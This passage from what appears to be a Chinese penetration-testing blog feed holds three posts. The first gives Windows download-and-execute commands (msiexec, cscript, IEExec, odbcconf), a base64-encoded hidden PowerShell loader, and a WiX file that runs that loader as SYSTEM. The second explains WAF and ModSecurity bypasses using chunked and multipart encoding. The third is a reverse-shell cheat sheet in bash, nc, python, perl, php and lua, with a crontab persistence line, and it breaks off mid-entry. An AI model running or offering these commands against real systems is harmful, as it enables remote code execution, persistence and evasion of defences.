\\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot;</span><br></pre></td></tr></table></figure><h3 id="10-odbcconf命令下载执行"><a href="#10-odbcconf命令下载执行" class="headerlink" title="10. odbcconf命令下载执行"></a>10. odbcconf命令下载执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf /s /a &#123;regsvr \\webdavserver\folder\payload_dll.txt&#125;</span><br></pre></td></tr></table></figure><h3 id="11-cscript脚本远程命令下载执行"><a href="#11-cscript脚本远程命令下载执行" class="headerlink" title="11.cscript脚本远程命令下载执行"></a>11.cscript脚本远程命令下载执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec3.sct</span><br><span class="line"></span><br><span class="line">cscript //E:jscript \\webdavserver\folder\payload.txt</span><br></pre></td></tr></table></figure><p>downfile.vbs:</p><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="http://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&apos; Set your settings</span><br><span class="line"></span><br><span class="line">strFileURL = &quot;http://www.it1.net/images/it1_logo2.jpg&quot;</span><br><span class="line"></span><br><span class="line">strHDLocation = &quot;c:\logo.jpg&quot;</span><br><span class="line"></span><br><span class="line">&apos; Fetch the file</span><br><span class="line"></span><br><span class="line">Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line"></span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line"></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line"></span><br><span class="line">If objXMLHTTP.Status = 200 Then</span><br><span class="line"></span><br><span class="line">Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line"></span><br><span class="line">objADOStream.Open</span><br><span class="line"></span><br><span class="line">objADOStream.Type = 1 &apos;adTypeBinary</span><br><span class="line"></span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line"></span><br><span class="line">objADOStream.Position = 0&apos;Set the stream position to the start</span><br><span class="line"></span><br><span class="line">Set objFSO = Createobject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line"></span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</span><br><span class="line"></span><br><span class="line">Set objFSO = Nothing</span><br><span class="line"></span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line"></span><br><span class="line">objADOStream.Close</span><br><span class="line"></span><br><span class="line">Set objADOStream = Nothing</span><br><span class="line"></span><br><span class="line">End if</span><br><span class="line"></span><br><span class="line">Set objXMLHTTP = Nothing</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="http://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><p>将以上保存为downfile.vbs</p><p>输入命令：cscript  downfile.vbs</p><h3 id="12-pubprn-vbs下载执行命令"><a href="#12-pubprn-vbs下载执行命令" class="headerlink" title="12.pubprn.vbs下载执行命令"></a>12.pubprn.vbs下载执行命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1  script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span><br></pre></td></tr></table></figure><h3 id="13-windows自带命令copy"><a href="#13-windows自带命令copy" class="headerlink" title="13.windows自带命令copy"></a>13.windows自带命令copy</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy \\x.x.x.x\xx\poc.exe</span><br><span class="line"></span><br><span class="line">xcopy d:\test.exe  \\x.x.x.x\test.exe</span><br></pre></td></tr></table></figure><h3 id="14-IEXPLORE-EXE命令下载执行-需要IE存在oday"><a href="#14-IEXPLORE-EXE命令下载执行-需要IE存在oday" class="headerlink" title="14. IEXPLORE.EXE命令下载执行(需要IE存在oday)"></a>14. IEXPLORE.EXE命令下载执行(需要IE存在oday)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\Internet Explorer\IEXPLORE.EXE&quot; http://site.com/exp</span><br></pre></td></tr></table></figure><h3 id="15-IEEXC命令下载执行"><a href="#15-IEEXC命令下载执行" class="headerlink" title="15.IEEXC命令下载执行"></a>15.IEEXC命令下载执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; caspol -s off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; IEExec http://site.com/files/test64.exe</span><br></pre></td></tr></table></figure><p>参考：<a href="https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" target="_blank" rel="noopener">https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</a></p><h3 id="16-msiexec命令下载执行"><a href="#16-msiexec命令下载执行" class="headerlink" title="16. msiexec命令下载执行"></a>16. msiexec命令下载执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i http://site.com/payloads/calc.png</span><br></pre></td></tr></table></figure><p>该方法我之前的两篇文章《渗透测试中的msiexec》《渗透技巧——从Admin权限切换到System权限》有过介绍，细节不再赘述</p><p>首先将powershell实现下载执行的代码作base64编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$fileContent = &quot;(new-object System.Net.WebClient).DownloadFile(&apos;https://github.com/3gstudent/test/raw/master/putty.exe&apos;,&apos;c:\download\a.exe&apos;);start-process &apos;c:\download\a.exe&apos;&quot;</span><br><span class="line">$bytes  = [System.Text.Encoding]::Unicode.GetBytes($fileContent);</span><br><span class="line">$encoded = [System.Convert]::ToBase64String($bytes); </span><br><span class="line">$encoded</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</span><br></pre></td></tr></table></figure><p>完整powershell命令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</span><br></pre></td></tr></table></figure><p>完整wix文件为：</p><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="http://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt;</span><br><span class="line">  &lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product </span><br><span class="line">Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt;</span><br><span class="line">    &lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt;</span><br><span class="line">    &lt;Media Id=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt;</span><br><span class="line">      &lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt;</span><br><span class="line">        &lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt;</span><br><span class="line">          &lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt;     </span><br><span class="line">          &lt;/Component&gt;</span><br><span class="line">        &lt;/Directory&gt;</span><br><span class="line">      &lt;/Directory&gt;</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line">    &lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt;</span><br><span class="line">      &lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt;</span><br><span class="line">    &lt;/Feature&gt;</span><br><span class="line">    &lt;Property Id=&quot;cmdline&quot;&gt;powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</span><br><span class="line">    &lt;/Property&gt;</span><br><span class="line">    &lt;CustomAction Id=&quot;SystemShell&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; </span><br><span class="line">ExeCommand=&apos;[cmdline]&apos; Return=&quot;ignore&quot; Impersonate=&quot;no&quot;/&gt;</span><br><span class="line">    &lt;CustomAction Id=&quot;FailInstall&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt;</span><br><span class="line">      invalid vbs to fail install</span><br><span class="line">    &lt;/CustomAction&gt;</span><br><span class="line">    &lt;InstallExecuteSequence&gt;</span><br><span class="line">      &lt;Custom Action=&quot;SystemShell&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt;</span><br><span class="line">      &lt;Custom Action=&quot;FailInstall&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt;</span><br><span class="line">    &lt;/InstallExecuteSequence&gt;</span><br><span class="line">  &lt;/Product&gt;</span><br><span class="line">&lt;/Wix&gt;</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="http://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><p>将其编译，生成msi文件，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">candle.exe msigen.wix</span><br><span class="line"></span><br><span class="line">light.exe msigen.wixobj</span><br></pre></td></tr></table></figure><p>生成test.msi</p><p><strong>实现功能：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i https://github.com/3gstudent/test/raw/master/test.msi</span><br></pre></td></tr></table></figure><p><strong>注：</strong></p><p>执行后需要手动结束进程msiexec.exe</p><p>结合百度提供的短地址服务(<a href="http://dwz.cn/)，" target="_blank" rel="noopener">http://dwz.cn/)，</a> 实现代码为34个字符，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i http://dwz.cn/6UJpF8</span><br></pre></td></tr></table></figure><h3 id="17-下载命令执行项目GreatSCT"><a href="#17-下载命令执行项目GreatSCT" class="headerlink" title="17.下载命令执行项目GreatSCT"></a>17.下载命令执行项目GreatSCT</h3><p><a href="https://github.com/GreatSCT/" target="_blank" rel="noopener">https://github.com/GreatSCT/</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;1-bitsadmin命令（只能命令下载到指定路径上，win7以上）：&quot;&gt;&lt;a href=&quot;#1-bitsadmin命令（只能命令下载到指定路径上，win7以上）：&quot; class=&quot;headerlink&quot; title=&quot;1.bitsadmin命令（只能命令下载到指定路径上，win7以上）：&quot;&gt;&lt;/a&gt;1.bitsadmin命令（只能命令下载到指定路径上，win7以上）：&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bitsadmin /transfer myDownLoadJob /download /priority normal &amp;quot;http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg&amp;quot; &amp;quot;d:\abc.jpg&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&amp;amp;%APPDATA%\d90f.exe&amp;amp;del %APPDATA%\d90f.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>HTTP分块传输</title>
    <link href="http://www.7wawa.com/2019/01/21/HTTP%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"/>
    <id>http://www.7wawa.com/2019/01/21/HTTP%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/</id>
    <published>2019-01-21T04:06:30.000Z</published>
    <updated>2019-01-21T04:27:16.545Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用pipline绕过"><a href="#利用pipline绕过" class="headerlink" title="利用pipline绕过"></a>利用pipline绕过</h2><p>修改为正常内容id=1，再将数据包的Content-Length的值设置为修改后的【id=1】的字符长度即4，最后将Connection字段值设为keep-alive。提交后如图七所示，会返回两个响应包，分别对应两个请求</p><a id="more"></a><p><img src="https://i.loli.net/2019/01/21/5c4546f470d85.png" alt=""></p><h2 id="二-利用分块编码传输绕过"><a href="#二-利用分块编码传输绕过" class="headerlink" title="二.利用分块编码传输绕过"></a>二.利用分块编码传输绕过</h2><p>在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束</p><p><img src="https://i.loli.net/2019/01/21/5c4548816636f.png" alt=""></p><p>通过阅读规范发现分块传输可以在长度标识处加上分号“;”作为注释，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">9;kkkkk</span><br><span class="line">1234567=1</span><br><span class="line">4;ooo=222</span><br><span class="line">2345</span><br><span class="line">0</span><br><span class="line">(两个换行)</span><br></pre></td></tr></table></figure><h2 id="技巧2-Bypass-ModSecurity"><a href="#技巧2-Bypass-ModSecurity" class="headerlink" title="技巧2 Bypass ModSecurity"></a>技巧2 Bypass ModSecurity</h2><p>众所周知ModSecurity是加载在中间件上的插件，所以不需要理会解析http数据包的问题，因为中间件已经帮它处理完了，那么无论使用常规的分块还是加了注释的分块数据包，ModSecurity都能直接获取到完整的http数据包然后匹配危险关键字，所以一些基于ModSecurity做的WAF产品难道就不受影响吗？</p><p>接下来我们传输一个畸形的分块数据包看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">请求:</span><br><span class="line">POST /sql.php?id=2%20union HTTP/1.1</span><br><span class="line">......</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">aa</span><br><span class="line">0</span><br><span class="line">(两个换行)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回:</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">========GET==========</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">   [id] =&gt; 2 union</span><br><span class="line">)</span><br><span class="line">========POST==========</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>可以看到虽然apache报错了，但是因为apache容错很强，所以我们提交的参数依然传到了php，而我们的ModSecurity并没有处理400错误的数据包，最终绕过了ModSecurity</p><h2 id="三-利用协议未覆盖进行绕过"><a href="#三-利用协议未覆盖进行绕过" class="headerlink" title="三.利用协议未覆盖进行绕过"></a>三.利用协议未覆盖进行绕过</h2><p>HTTP头里的Content-Type一般有application/x-www-form-urlencoded，multipart/form-data，text/plain三种，其中multipart/form-data表示数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当waf没有规则匹配该协议传输的数据时可被绕过。</p><p>1.将头部Content-Type改为multipart/form-data; boundary=69   然后设置分割符内的Content-Disposition的name为要传参数的名称。数据部分则放在分割结束符上一行</p><p><img src="https://i.loli.net/2019/01/21/5c4548e071251.png" alt=""></p><h2 id="四-分块编码-协议未覆盖组合绕过"><a href="#四-分块编码-协议未覆盖组合绕过" class="headerlink" title="四.分块编码+协议未覆盖组合绕过"></a>四.分块编码+协议未覆盖组合绕过</h2><p><img src="https://i.loli.net/2019/01/21/5c454909a8f01.png" alt=""></p><p><strong>注意：</strong>第2块，第3块，第7块，和第8块。</p><p><strong>第2块</strong>中需要满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">长度值</span><br><span class="line">空行</span><br><span class="line">Content-Disposition: name=&quot;id&quot;</span><br><span class="line">空行</span><br></pre></td></tr></table></figure><p>这种形式，且长度值要将两个空行的长度计算在内（空行长度为2）。</p><p><strong>第3块</strong>，即数据开始部分需满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">长度值 </span><br><span class="line">空行</span><br><span class="line">数据</span><br></pre></td></tr></table></figure><p>形式，且需将空行计算在内。</p><p><strong>第7块</strong>即分割边界结束部分，需满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">长度值</span><br><span class="line">空行</span><br><span class="line">分割结束符</span><br><span class="line">空行</span><br></pre></td></tr></table></figure><p>形式，且计算空行长度在内。</p><p><strong>第8块</strong>需满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0  </span><br><span class="line">空行</span><br><span class="line">空行</span><br></pre></td></tr></table></figure><p>形式。如果不同时满足这四块的形式要求，payload将不会生效。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;利用pipline绕过&quot;&gt;&lt;a href=&quot;#利用pipline绕过&quot; class=&quot;headerlink&quot; title=&quot;利用pipline绕过&quot;&gt;&lt;/a&gt;利用pipline绕过&lt;/h2&gt;&lt;p&gt;修改为正常内容id=1，再将数据包的Content-Length的值设置为修改后的【id=1】的字符长度即4，最后将Connection字段值设为keep-alive。提交后如图七所示，会返回两个响应包，分别对应两个请求&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>反弹shell姿势</title>
    <link href="http://www.7wawa.com/2019/01/19/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF/"/>
    <id>http://www.7wawa.com/2019/01/19/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF/</id>
    <published>2019-01-19T14:59:35.000Z</published>
    <updated>2019-01-21T04:07:39.014Z</updated>
    
    <content type="html"><![CDATA[<p>不过无论怎么玩，还是直接弹回一个<code>shell</code>来最实用，于是可以有</p><p>basn方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><a id="more"></a><p>exec方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ exec 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line">$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure><p><strong>nc方式</strong></p><p>本机运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p port</span><br></pre></td></tr></table></figure><p>目标主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash ip port</span><br></pre></td></tr></table></figure><p>另一种nc方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh | nc 受害者ip port    #这个比较特殊,需要在你自己的机器上运行</span><br></pre></td></tr></table></figure><p>python方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure><p>另一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure><p>perl方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure><p>php方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure><p>lua方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br><span class="line">#需要lua socket支持，且lua5.2+不支持luasocket</span><br></pre></td></tr></table></figure><p>crontab方式</p><p>crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是 /var/spool/cron/目录，ubuntu是/ var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/bash</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>telnet方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 